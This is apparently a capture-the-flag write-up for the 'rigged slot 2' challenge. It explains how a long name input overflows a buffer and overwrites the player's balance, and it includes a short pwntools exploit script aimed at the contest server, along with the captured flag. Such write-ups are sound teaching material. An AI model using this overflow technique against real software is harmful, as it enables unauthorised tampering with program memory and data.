# Description 
The casino fixed their slot machine algorithm - good luck hitting that jackpot now! 🤭

`nc riggedslot2.ctf.intigriti.io 1337`

# Flag
INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}

# Analysis
Analyzing the source code we can see the goal is to get 1337420 as the balance of the user to call the payout function that will print the flag. So, now we need to find the injection point. To test I ran the binary on my machine and tested the inputs. 

![image](https://github.com/user-attachments/assets/17a30520-de2f-45a7-bac5-9f540063bac4)

As you can see when inputting a long name the value of the ascii characters after a certain threshold will replace the current balance of the user. Nice, this means we found the injection point so from here you need to now find the padding then you can find the point at which we can overwrite the balance value. I just tested this manually so I generated cyclic patterns until I noticed the overflow:

![image](https://github.com/user-attachments/assets/f2d8a95e-b99b-4015-b1ad-2e019f591c2f)

# Solution
When I inputted the name value that gave 0 balance that's when I knew I hit the padding, so from this I knew the padding was 20 bytes. Now we just need the script to execute the exploit. The script I used was this:
```
from pwn import *

# Connect to the remote service
p = remote('riggedslot2.ctf.intigriti.io', 1337)

# The desired value to overwrite the balance with (1337420 in decimal -> 0x141C24 in hex)
target_value = p32(1337421)  # p32 converts the value to little-endian format

# Padding of 20 characters (this can be adjusted depending on the exact buffer size)
padding = b'a' * 20

# Craft the input: padding + target value
exploit_input = padding + target_value

# Send the crafted input as the name
p.recvuntil("Enter your name:")  # Wait for the prompt
p.sendline(exploit_input)  # Send the exploit

# Interact with the program after the exploit
p.interactive()

```

The target value that I inputted had to be 1 more than 1337420 so that when you submitted your first bet the next balance the user would have would be 1337420 since the condition is that the play function must be executed and then the balance of the user is checked like so:

![image](https://github.com/user-attachments/assets/15102f05-6a26-4a71-935c-62fd7f7eb1b6)


#L337upCTF2024 
